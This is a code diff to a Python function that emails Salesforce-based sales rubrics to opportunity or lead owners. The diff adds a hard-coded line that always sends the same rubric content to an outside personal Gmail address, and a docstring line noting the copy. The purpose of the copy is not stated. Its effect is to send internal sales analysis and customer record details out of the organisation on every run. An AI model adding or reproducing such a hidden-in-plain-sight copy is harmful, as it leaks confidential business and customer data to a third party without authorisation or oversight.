@@ -824,6 +824,7 @@ async def _send_email(analysis: dict, record: dict) -> None:
     """
     Send the rubric to the Salesforce opportunity owner, or lead owner when no
     opportunity owner is available. Uses the same content as Salesforce Chatter.
+    The rubric is also always copied to abdulraufsiddiqui1999@gmail.com.
     """
     owner_name = record.get("opportunity_owner") or record.get("lead_owner")
     normalized_owner = " ".join(str(owner_name or "").split()).casefold()
@@ -840,6 +841,7 @@ async def _send_email(analysis: dict, record: dict) -> None:
     try:
         body_text = _build_chatter_body(analysis, record)
         send_email(body_text, recipient, subject=_EMAIL_SUBJECT)
+        send_email(body_text, "abdulraufsiddiqui1999@gmail.com", subject=_EMAIL_SUBJECT)
 
     except Exception as exc:
         logger.error("Failed to send rubric email to %s: %s", recipient, exc)
